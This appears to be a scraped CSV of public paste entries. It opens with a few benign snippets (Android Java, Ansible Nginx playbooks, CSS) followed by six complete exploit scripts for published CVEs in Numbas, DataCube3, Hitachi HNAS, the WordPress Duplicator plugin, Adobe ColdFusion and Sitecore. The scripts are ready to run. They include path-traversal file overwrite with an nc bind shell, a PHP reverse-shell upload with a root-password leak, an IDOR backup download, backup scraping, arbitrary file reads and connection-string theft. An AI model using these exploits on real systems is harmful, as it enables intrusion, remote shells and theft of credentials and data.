id,title,username,language,date,content
X5fTKAYd,Transparent status bar and action bar,SenpaiZero,Java,Tuesday 12th of March 2024 08:48:50 AM CDT,"public void removeActionbar()
    {
        try
        {
            ((AppCompatActivity)activity).getSupportActionBar().hide();
        } catch (Exception ex)
        {
            try {
                activity.getActionBar().hide();
            } catch (Exception exx)
            {
                Log.e(""Action Bar"", exx.getMessage());
            }
        }
    }

    public void transparentStatusBar()
    {
        try {
            Window window = activity.getWindow();
            window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
            window.setStatusBarColor(Color.TRANSPARENT);
        } catch (Exception ex)
        {
            Log.e(""Transparent Status Bar"", ex.getMessage());
        }

    }"
FeMU0Xn7,Nginx playbook - 2,PandaAcademy,YAML,Tuesday 12th of March 2024 08:21:50 AM CDT,"---
- name: Install Nginx
  hosts: all
  connection: local
  become: yes
  tasks:
    - name: Update apt package index
      apt: update_cache=yes force_apt_get=yes cache_valid_time=3600


    - name: Install Nginx
      apt:
        name: nginx
        state: present

    - name: Ensure Nginx is running and enabled
      systemd:
        name: nginx
        state: started
        enabled: yes

    - name: Copy Nginx server block file
      copy:
        src: ""templates/site.conf""
        dest: ""/etc/nginx/sites-enabled/site.conf""
     register: template_result

    - name: Reload Nginx if configuration changed
      systemd:
        name: nginx
        state: reloaded
      when: template_result is changed
"
LfbYxKm2,Nginx playbook - 1,PandaAcademy,YAML,Tuesday 12th of March 2024 08:07:46 AM CDT,"---
- name: Install Nginx
  hosts: all
  connection: local
  become: yes
  tasks:
    - name: Update apt package index
      apt: update_cache=yes force_apt_get=yes cache_valid_time=3600

    - name: Install Nginx
      apt:
        name: nginx
        state: present

    - name: Ensure Nginx is running and enabled
      systemd:
        name: nginx
        state: started
        enabled: yes

    - name: Copy Nginx server block file
      copy:
        src: ""templates/site.conf""
        dest: ""/etc/nginx/sites-enabled/site.conf""

    - name: Reload Nginx if configuration changed
      systemd:
        name: nginx
        state: reloaded
"
XLPSVCaV,Review Windsor Brokers,reviewbrokers,PHP,Tuesday 12th of March 2024 08:04:59 AM CDT,https://www.reviewbrokers.net/review-windsor-brokers/
4gDqU5UV,Untitled,D3ENNY,CSS,Tuesday 12th of March 2024 07:34:27 AM CDT,"styles.scss
@import 'tailwindcss/base';
@import 'tailwindcss/components';
@import 'tailwindcss/utilities';
@import './assets/style/root.css'


root.css

:root {
    --obsidian: '#0B1215';
    --oil-50:  '#8e7f4f';
    --oil-100: '#7a6743';
    --oil-200: '#63532f';
    --oil-300: '#5c4f2b';
    --oil-400: '#554b27';
    --oil-500: '#4e4723';
    --oil-600: '#47431f';
    --oil-700: '#403f1b';
    --oil-800: '#393b17';
    --oil-900: '#323613';
}

component.scss

section {
    min-height: 100vh;
    height: max-content;
    
    #bottle > div > img{
        filter: drop-shadow(16px 16px 8px);
        border: 4px solid var(--oil-200);
    }
}
"
Nbagy9Eg,Numbas < v7.3 - Remote Code Execution - CVE-2024-27612,FlyFar,Python,Tuesday 12th of March 2024 07:34:00 AM CDT,"# Exploit Title: Numbas < v7.3 - Remote Code Execution
# Google Dork: N/A
# Date: March 7th, 2024
# Exploit Author: Matheus Boschetti
# Vendor Homepage: https://www.numbas.org.uk/
# Software Link: https://github.com/numbas/Numbas
# Version: 7.2 and below
# Tested on: Linux
# CVE: CVE-2024-27612

import sys, requests, re, argparse, subprocess, time
from bs4 import BeautifulSoup

s = requests.session()

def getCSRF(target):
    url = f""http://{target}/""
    req = s.get(url)
    soup = BeautifulSoup(req.text, 'html.parser')
    csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value']
    return csrfmiddlewaretoken

def createTheme(target):
    # Format request
    csrfmiddlewaretoken = getCSRF(target)
    theme = 'ExampleTheme'
    boundary = '----WebKitFormBoundaryKUMXsLP31HzARUV1'
    data = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name=""csrfmiddlewaretoken""\r\n'
        '\r\n'
        f'{csrfmiddlewaretoken}\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name=""name""\r\n'
        '\r\n'
        f'{theme}\r\n'
        f'--{boundary}--\r\n'
    )
    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}',
               'User-Agent': 'Mozilla/5.0',
               'Accept': '*/*',
               'Connection': 'close'}

    # Create theme and return its ID
    req = s.post(f""http://{target}/theme/new/"", headers=headers, data=data)
    redir = req.url
    split = redir.split('/')
    id = split[4]
    print(f""\t[i] Theme created with ID {id}"")
    return id

def login(target, user, passwd):
    print(""\n[i] Attempting to login..."")

    csrfmiddlewaretoken = getCSRF(target)
    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,
            'username': user,
            'password': passwd,
            'next': '/'}
    
    # Login
    login = s.post(f""http://{target}/login/"", data=data, allow_redirects=True)
    res = login.text
    if(""Logged in as"" not in res):
        print(""\n\n[!] Login failed!"")
        sys.exit(-1)

    # Check if logged and fetch ID
    usermatch = re.search(r'Logged in as <strong>(.*?)</strong>', res)
    if usermatch:
        user = usermatch.group(1)
        idmatch = re.search(r'<a href=""/accounts/profile/(.*?)/""><span class=""glyphicon glyphicon-user"">', res)
        if idmatch:
            id = idmatch.group(1)
            print(f""\t[+] Logged in as \""{user}\"" with ID {id}"")

def checkVuln(url):
    print(""[i] Checking if target is vulnerable..."")

    # Attempt to read files
    themeID = createTheme(url)
    target = f""http://{url}/themes/{themeID}/edit_source?filename=../../../../../../../../../..""
    hname = s.get(f""{target}/etc/hostname"")
    ver = s.get(f""{target}/etc/issue"")
    hnamesoup = BeautifulSoup(hname.text, 'html.parser')
    versoup = BeautifulSoup(ver.text, 'html.parser')
    hostname = hnamesoup.find('textarea').get_text().strip()
    version = versoup.find('textarea').get_text().strip()
    if len(hostname) < 1:
        print(""\n\n[!] Something went wrong - target might not be vulnerable."")
        sys.exit(-1)
    print(f""\n[+] Target \""{hostname}\"" is vulnerable!"")
    print(f""\t[i] Running: \""{version}\"""")

    # Cleanup - delete theme
    print(f""\t\t[i] Cleanup: deleting theme {themeID}..."")
    target = f""http://{url}/themes/{themeID}/delete""
    csrfmiddlewaretoken = getCSRF(url)
    data = {'csrfmiddlewaretoken':csrfmiddlewaretoken}
    s.post(target, data=data)


def replaceInit(target):
    # Overwrite __init__.py with arbitrary code
    rport = '8443'
    payload = f""import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])""
    csrfmiddlewaretoken = getCSRF(target)
    filename = '../../../../numbas_editor/numbas/__init__.py'
    themeID = createTheme(target)
    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,
            'source': payload,
            'filename': filename}

    print(""[i] Delivering payload..."")
    # Retry 5 times in case something goes wrong...
    for attempt in range(5):
        try:
            s.post(f""http://{target}/themes/{themeID}/edit_source"", data=data, timeout=10)
        except Exception as e:
            pass
    
    # Establish connection to bind shell
    time.sleep(2)
    print(f""\t[+] Payload delivered, establishing connection...\n"")
    if "":"" in target:
        split = target.split("":"")
        ip = split[0]
    else:
        ip = str(target)
    subprocess.Popen([""nc"", ""-n"", ip, rport])
    while True:
        pass


def main():
    parser = argparse.ArgumentParser()
    if len(sys.argv) <= 1:
        print(""\n[!] No option provided!"")
        print(""\t- check: Passively check if the target is vulnerable by attempting to read files from disk\n\t- exploit: Attempt to actively exploit the target\n"")
        print(f""[i] Usage: python3 {sys.argv[0]} <option> --target 172.16.1.5:80 --user example --passwd qwerty"")
        sys.exit(-1)

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit')
    parser.add_argument('--target', help='Target IP:PORT')
    parser.add_argument('--user', help='Username to authenticate')
    parser.add_argument('--passwd', help='Password to authenticate')
    args = parser.parse_args()
    action = args.action
    target = args.target
    user = args.user
    passwd = args.passwd

    print(""\n\t\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-"")
    
    if action == 'check':
        login(target, user, passwd)
        checkVuln(target)
    elif action == 'exploit':
        login(target, user, passwd)
        replaceInit(target)
    else:
        sys.exit(-1)


if __name__ == ""__main__"":
    main()
            "
X32T9jxN,DataCube3 v1.0 - Unrestricted file upload 'RCE' - CVE-2024-25830 + CVE-2024-25832,FlyFar,Python,Tuesday 12th of March 2024 07:32:45 AM CDT,"# Exploit Title: DataCube3 v1.0 - Unrestricted file upload 'RCE'
# Date: 7/28/2022
# Exploit Author: Samy Younsi - NS Labs (https://neroteam.com)
# Vendor Homepage: https://www.f-logic.jp
# Software Link: https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf
# Version: Ver1.0
# Tested on: DataCube3 version 1.0 (Ubuntu)
# CVE : CVE-2024-25830 + CVE-2024-25832

# Exploit chain reverse shell, information disclosure (root password leak) + unrestricted file upload

from __future__ import print_function, unicode_literals
from bs4 import BeautifulSoup
import argparse
import requests
import json
import urllib3
import re
urllib3.disable_warnings()

def banner():
  dataCube3Logo = """""" 
        ▒▒▒▒▒▒████████████████████████████████████▓▓▓▓▓▓▓▓
      ▒▒▒▒▒▒▒▒██        DataCube3   Ver1.0      █F-logic▓▓
      ▒▒████▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
      ▒▒████▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
      ▒▒▒▒▒▒▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
      ▒▒▒▒▒▒▒▒██                                ██▓▓████▓▓
      ▒▒▒▒▒▒▒▒██        ██             ██       ██▓▓████▓▓
      ▒▒▒▒▒▒▒▒██        █████████████████       ██▓▓▓▓▓▓▓▓
        ▒▒▒▒▒▒████████████████████████████████████▓▓▓▓▓▓                                       
                                                                                 
\033[1;92mSamy Younsi (Necrum Security Labs)\033[1;m         \033[1;91mDataCube3 exploit chain reverse shell\033[1;m                                                 
                FOR EDUCATIONAL PURPOSE ONLY.   
  """"""
  return print('\033[1;94m{}\033[1;m'.format(dataCube3Logo))


def extractRootPwd(RHOST, RPORT, protocol):
  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)
  try:
    response = requests.get(url, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
      print('[!] \033[1;91mError: DataCube3 web interface is not reachable. Make sure the specified IP is correct.\033[1;m')
      exit()
    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
    scriptTag = str(soup.find_all('script')[12]).replace(' ', '')
    rawLeakedData = re.findall('configData:.*,', scriptTag)[0]
    jsonLeakedData = json.loads('[{}]'.format(rawLeakedData.split('configData:[')[1].split('],')[0]))
    adminPassword = jsonLeakedData[12]['value']
    rootPassword = jsonLeakedData[14]['value']
    print('[INFO] DataCube3 leaked credentials successfully extracted: admin:{} | root:{}.\n[INFO] The target must be vulnerable.'.format(adminPassword, rootPassword))
    return rootPassword
  except:
    print('[ERROR] Can\'t grab the DataCube3 version...')


def generateAuthCookie(RHOST, RPORT, protocol, rootPassword):
  print('[INFO] Generating DataCube3 auth cookie ...')
  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)
  data = {
    'user_id': 'root',
    'user_pw': rootPassword,
    'login': '%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3'
  }
  try:
    response = requests.post(url, data=data, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
      print('[!] \033[1;91mError: An error occur while trying to get the auth cookie, is the root password correct?\033[1;m')
      exit()
    authCookie = response.cookies.get_dict() 
    print('[INFO] Authentication successful! Auth Cookie: {}'.format(authCookie))  
    return authCookie
  except:
    print('[ERROR] Can\'t grab the auth cookie, is the root password correct?')


def extractAccesstime(RHOST, RPORT, LHOST, LPORT, protocol, authCookie):
  print('[INFO] Extracting Accesstime ...')
  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)
  try:
    response = requests.get(url, cookies=authCookie, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
      print('[!] \033[1;91mError: An error occur while trying to get the accesstime value.\033[1;m')
      exit()
    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
    accessTime = soup.find('input', {'name': 'accesstime'}).get('value')
    print('[INFO] AccessTime value: {}'.format(accessTime))
    return accessTime
  except:
    print('[ERROR] Can\'t grab the accesstime value, is the root password correct?')


def injectReverseShell(RHOST, RPORT, LHOST, LPORT, protocol, authCookie, accessTime):
  print('[INFO] Injecting PHP reverse shell script ...')
  filename='rvs.php'
  payload = '<?php $sock=fsockopen(""{}"",{});$proc=proc_open(""sh"", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'.format(LHOST, LPORT)

  data = '-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""add""\r\n\r\nå��ç��è¿½å�\xA0\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""addPhoto""; filename=""{}""\r\nContent-Type: image/jpeg\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""accesstime""\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396--\r\n'.format(filename, payload, accessTime)

  headers = {
      'Content-Type': 'multipart/form-data; boundary=---------------------------113389720123090127612523184396'
  }
  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)
  try:
    response = requests.post(url, cookies=authCookie, headers=headers, data=data, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
        print('[!] \033[1;91mError: An error occur while trying to upload the PHP reverse shell script.\033[1;m')
        exit()
    shellURL = '{}://{}:{}/images/slideshow/{}'.format(protocol, RHOST, RPORT, filename)
    print('[INFO] PHP reverse shell script successfully uploaded!\n[INFO] SHELL URL: {}'.format(shellURL))
    return shellURL
  except:
    print('[ERROR] Can\'t upload the PHP reverse shell script, is the root password correct?')


def execReverseShell(shellURL):
  print('[INFO] Executing reverse shell...')
  try:
    response = requests.get(shellURL, allow_redirects=False, verify=False)
    print('[INFO] Reverse shell successfully executed.')
    return
  except Exception as e:
      print('[ERROR] Reverse shell failed. Make sure the DataCube3 device can reach the host {}:{}')
      return False


def main():
  banner()
  args = parser.parse_args()
  protocol = 'https' if args.RPORT == 443 else 'http'
  rootPassword = extractRootPwd(args.RHOST, args.RPORT, protocol)
  authCookie = generateAuthCookie(args.RHOST, args.RPORT, protocol, rootPassword)
  accessTime = extractAccesstime(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie)
  shellURL = injectReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie, accessTime)
  execReverseShell(shellURL)


if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Script PoC that exploit an unauthenticated remote command injection on f-logic DataCube3 devices.', add_help=False)
  parser.add_argument('--RHOST', help='Refers to the IP of the target machine. (f-logic DataCube3 device)', type=str, required=True)
  parser.add_argument('--RPORT', help='Refers to the open port of the target machine. (443 by default)', type=int, required=True)
  parser.add_argument('--LHOST', help='Refers to the IP of your machine.', type=str, required=True)
  parser.add_argument('--LPORT', help='Refers to the open port of your machine.', type=int, required=True)
  main()
            "
mCBirecn,Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore < 14.8.7825.01 - IDOR,FlyFar,Python,Tuesday 12th of March 2024 07:30:56 AM CDT,"#!/usr/bin/python3
#
# Title:            Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore IDOR Vulnerability 
# CVE:              CVE-2023-5808
# Date:             2023-12-13
# Exploit Author:   Arslan Masood (@arszilla)
# Vendor:           https://www.hitachivantara.com/
# Version:          < 14.8.7825.01
# Tested On:        13.9.7021.04        

import argparse
from datetime import datetime
from os import getcwd

import requests

parser = argparse.ArgumentParser(
    description=""CVE-2023-5808 PoC"",
    usage=""./CVE-2023-5808.py --host <Hostname/FQDN/IP> --id <JSESSIONID> --sso <JSESSIONIDSSO>""
    )

# Create --host argument:
parser.add_argument(
    ""--host"",
    required=True,
    type=str,
    help=""Hostname/FQDN/IP Address. Provide the port, if necessary, i.e. 127.0.0.1:8443, example.com:8443""
    )

# Create --id argument:
parser.add_argument(
    ""--id"",
    required=True,
    type=str,
    help=""JSESSIONID cookie value""
    )

# Create --sso argument:
parser.add_argument(
    ""--sso"",
    required=True,
    type=str,
    help=""JSESSIONIDSSO cookie value""
    )

args = parser.parse_args()

def download_file(hostname, jsessionid, jsessionidsso):
    # Set the filename:
    filename = f""smu_backup-{datetime.now().strftime('%Y-%m-%d_%H%M')}.zip""

    # Vulnerable SMU URL:
    smu_url = f""https://{hostname}/mgr/app/template/simple%2CBackupSmuScreen.vm/password/""

    # GET request cookies
    smu_cookies = {
        ""JSESSIONID"":       jsessionid,
        ""JSESSIONIDSSO"":    jsessionidsso
        }

    # GET request headers:
    smu_headers = {
        ""User-Agent"":                   ""Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"",
        ""Accept"":                       ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"",
        ""Accept-Language"":              ""en-US,en;q=0.5"",
        ""Accept-Encoding"":              ""gzip, deflate"",
        ""Dnt"":                          ""1"",
        ""Referer"":                      f""https://{hostname}/mgr/app/action/admin.SmuBackupRestoreAction/eventsubmit_doperform/ignored"",
        ""Upgrade-Insecure-Requests"":    ""1"",
        ""Sec-Fetch-Dest"":               ""document"",
        ""Sec-Fetch-Mode"":               ""navigate"",
        ""Sec-Fetch-Site"":               ""same-origin"",
        ""Sec-Fetch-User"":               ""?1"",
        ""Te"":                           ""trailers"",
        ""Connection"":                   ""close""
        }

    # Send the request:
    with requests.get(smu_url, headers=smu_headers, cookies=smu_cookies, stream=True, verify=False) as file_download:
        with open(filename, 'wb') as backup_archive:
            # Write the zip file to the CWD:
            backup_archive.write(file_download.content)

    print(f""{filename} has been downloaded to {getcwd()}"")

if __name__ == ""__main__"":
    download_file(args.host, args.id, args.sso)
            "
jcLdAyTH,WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover,FlyFar,Python,Tuesday 12th of March 2024 07:29:13 AM CDT,"# Exploit Title: WordPress Plugin Duplicator < 1.5.7.1 -
Unauthenticated Sensitive Data Exposure to Account Takeover
# Google Dork: inurl:(""plugins/duplicator/"")
# Date: 2023-12-04
# Exploit Author: Dmitrii Ignatyev
# Vendor Homepage: https://duplicator.com/?utm_source=duplicator_free&utm_medium=wp_org&utm_content=desc_details&utm_campaign=duplicator_free
# Software Link: https://wordpress.org/plugins/duplicator/
# Version: 1.5.7.1
# Tested on: WordPress 6.4
# CVE : CVE-2023-6114# CVE-Link:https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1/

# CVE-Link: https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit/A
severe vulnerability has been discovered in the directory
*/wordpress/wp-content/backups-dup-lite/tmp/*. This flaw not only
exposes extensive information about the site, including its
configuration, directories, and files, but more critically, it
provides unauthorized access to sensitive data within the database and
all data inside. Exploiting this vulnerability poses an imminent
threat, leading to potential *brute force attacks on password hashes
and, subsequently, the compromise of the entire system*.*
POC*:

1) It is necessary that either the administrator or auto-backup works
automatically at the scheduled time

2) Exploit will send file search requests every 5 seconds

3) I attack the site with this vulnerability using an exploit

Exploit sends a request to the server every 5 seconds along the path
“*http://your_site/wordpress/wp-content/backups-dup-lite/tmp/
<http://your_site/wordpress/wp-content/backups-dup-lite/tmp/>”* and if
it finds something in the index of, it instantly parses all the data
and displays it on the screen

Exploit (python3):

import requests
from bs4 import BeautifulSoup
import re
import time

url = ""http://127.0.0.1/wordpress/wp-content/backups-dup-lite/tmp/""
processed_files = set()

def get_file_names(url):
    response = requests.get(url)

    if response.status_code == 200 and len(response.text) > 0:
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a')

        file_names = []
        for link in links:
            file_name = link.get('href')
            if file_name != ""../"" and not file_name.startswith(""?""):
                file_names.append(file_name)

        return file_names
    return []

def get_file_content(url, file_name):
    file_url = url + file_name


    if re.search(r'\.zip(?:\.|$)', file_name, re.IGNORECASE):
        print(f""Ignoring file: {file_name}"")
        return None

    file_response = requests.get(file_url)

    if file_response.status_code == 200:
        return file_response.text
    return None

while True:
    file_names = get_file_names(url)

    if file_names:
        print(""File names on the page:"")
        for file_name in file_names:
            if file_name not in processed_files:
                print(file_name)
                file_content = get_file_content(url, file_name)

                if file_content is not None:
                    print(""File content:"")
                    print(file_content)
                    processed_files.add(file_name)

    time.sleep(5)



-- 
With best regards,
Dmitrii Ignatyev, Penetration Tester
            "
FC9VDEq0,"Adobe ColdFusion versions 2018,15 and 2021,5 and earlier - Arbitrary File Read - CVE-2023-26360",FlyFar,Python,Tuesday 12th of March 2024 07:26:52 AM CDT,"# Exploit Title: File Read Arbitrary Exploit for CVE-2023-26360
# Google Dork: [not]
# Date: [12/28/2023]
# Exploit Author: [Youssef Muhammad]
# Vendor Homepage: [
https://helpx.adobe.com/coldfusion/kb/coldfusion-downloads.html]
# Software Link: [
https://drive.google.com/drive/folders/17ryBnFhswxiE1sHrNByxMVPKfUnwqmp0]
# Version: [Adobe ColdFusion versions 2018,15 (and earlier) and 2021,5 and
earlier]
# Tested on: [Windows, Linux]
# CVE : [CVE-2023-26360]

import sys
import requests
import json

BANNER = """"""
   ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████   ██████  ██████   ██████   ██████  
  ██      ██    ██ ██                 ██ ██  ████      ██      ██            ██ ██            ██ ██       ██  ████ 
  ██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████  ███████   █████  ███████  ██ ██ ██ 
  ██       ██  ██  ██            ██      ████  ██ ██           ██       ██      ██    ██      ██ ██    ██ ████  ██ 
   ██████   ████   ███████       ███████  ██████  ███████ ██████        ███████  ██████  ██████   ██████   ██████                                                                                                                                                                                                                                       
""""""

RED_COLOR = ""\033[91m""
GREEN_COLOR = ""\032[42m""
RESET_COLOR = ""\033[0m""

def print_banner():
    print(RED_COLOR + BANNER + ""                  Developed by SecureLayer7"" + RESET_COLOR)
    return 0

def run_exploit(host, target_file, endpoint=""/CFIDE/wizards/common/utils.cfc"", proxy_url=None):
    if not endpoint.endswith('.cfc'):
        endpoint += '.cfc'

    if target_file.endswith('.cfc'):
        raise ValueError('The TARGET_FILE must not point to a .cfc')

    targeted_file = f""a/{target_file}""
    json_variables = json.dumps({""_metadata"": {""classname"": targeted_file}, ""_variables"": []})

    vars_get = {'method': 'test', '_cfclient': 'true'}
    uri = f'{host}{endpoint}'

    response = requests.post(uri, params=vars_get, data={'_variables': json_variables}, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)

    file_data = None
    splatter = '<!-- "" ---></TD></TD></TD></TH></TH></TH>'

    if response.status_code in [404, 500] and splatter in response.text:
        file_data = response.text.split(splatter, 1)[0]

    if file_data is None:
        raise ValueError('Failed to read the file. Ensure the CFC_ENDPOINT, CFC_METHOD, and CFC_METHOD_PARAMETERS are set correctly, and that the endpoint is accessible.')

    print(file_data)

    # Save the output to a file
    output_file_name = 'output.txt'
    with open(output_file_name, 'w') as output_file:
        output_file.write(file_data)
        print(f""The output saved to {output_file_name}"")

if __name__ == ""__main__"":
    if not 3 <= len(sys.argv) <= 5:
        print(""Usage: python3 script.py <host> <target_file> [endpoint] [proxy_url]"")
        sys.exit(1)

    print_banner()

    host = sys.argv[1]
    target_file = sys.argv[2]
    endpoint = sys.argv[3] if len(sys.argv) > 3 else ""/CFIDE/wizards/common/utils.cfc""
    proxy_url = sys.argv[4] if len(sys.argv) > 4 else None

    try:
        run_exploit(host, target_file, endpoint, proxy_url)
    except Exception as e:
        print(f""Error: {e}"")
            "
CMzTmj5u,Sitecore - Remote Code Execution v8.2 - CVE-2023-35813,FlyFar,Python,Tuesday 12th of March 2024 07:24:23 AM CDT,"#!/usr/bin/env python3
#
# Exploit Title: Sitecore - Remote Code Execution v8.2 
# Exploit Author: abhishek morla
# Google Dork: N/A
# Date: 2024-01-08
# Vendor Homepage: https://www.sitecore.com/
# Software Link: https://dev.sitecore.net/
# Version: 10.3
# Tested on: windows64bit / mozila firefox 
# CVE : CVE-2023-35813
# The vulnerability impacts all Experience Platform topologies (XM, XP, XC) from 9.0 Initial Release to 10.3 Initial Release; 8.2 is also impacted
# Blog : https://medium.com/@abhishekmorla/uncovering-cve-2023-35813-retrieving-core-connection-strings-in-sitecore-5502148fce09
# Video POC : https://youtu.be/vWKl9wgdTB0

import argparse
import requests
from urllib.parse import quote
from rich.console import Console

console = Console()
def initial_test(hostname):
    # Initial payload to test vulnerability
    test_payload = '''
    <%@Register
        TagPrefix = 'x'
        Namespace = 'System.Runtime.Remoting.Services'
        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    %>
    <x:RemotingService runat='server'
    Context-Response-ContentType='TestVulnerability'
    />
    '''
    encoded_payload = quote(test_payload)

    url = f""https://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index""
    headers = {""Content-Type"": ""application/x-www-form-urlencoded""}
    data = ""__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\""{}\"")"".format(encoded_payload)

    response = requests.post(url, headers=headers, data=data, verify=False)

    # Check for the test string in the Content-Type of the response
    return 'TestVulnerability' in response.headers.get('Content-Type', '')

def get_payload(choice):
    # Payload templates for different options
    payloads = {
        '1': ""<%$ ConnectionStrings:core %>"",
        '2': ""<%$ ConnectionStrings:master %>"",
        '3': ""<%$ ConnectionStrings:web %>""
    }

    base_payload = '''
    <%@Register
        TagPrefix = 'x'
        Namespace = 'System.Runtime.Remoting.Services'
        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    %>
    <x:RemotingService runat='server'
    Context-Response-ContentType='{}'
    />
    '''

    return base_payload.format(payloads.get(choice, ""Invalid""))

def main(hostname):
    if initial_test(hostname):
        print(""Exploiting, Please wait..."")
        console.print(""[bold green]The target appears to be vulnerable. Proceed with payload selection.[/bold green]"")
        print(""Select the payload to use:"")
        print(""1: Core connection strings"")
        print(""2: Master connection strings"")
        print(""3: Web connection strings"")
        payload_choice = input(""Enter your choice (1, 2, or 3): "")

        payload = get_payload(payload_choice)
        encoded_payload = quote(payload)

        url = f""http://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index""
        headers = {""Content-Type"": ""application/x-www-form-urlencoded""}
        data = ""__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\""{}\"")"".format(encoded_payload)

        response = requests.post(url, headers=headers, data=data)

        if 'Content-Type' in response.headers:
            print(""Content-Type from the response header:"")
            print(""\n"")
            print(response.headers['Content-Type'])
        else:
            print(""No Content-Type in the response header. Status Code:"", response.status_code)
    else:
        print(""The target does not appear to be vulnerable to CVE-2023-35813."")


if __name__ == ""__main__"":
    console.print(""[bold green]Author: Abhishek Morla[/bold green]"")
    console.print(""[bold red]CVE-2023-35813[/bold red]"")
    parser = argparse.ArgumentParser(description='Test for CVE-2023-35813 vulnerability in Sitecore')
    parser.add_argument('hostname', type=str, help='Hostname of the target Sitecore instance')
    args = parser.parse_args()

    main(args.hostname)
            "
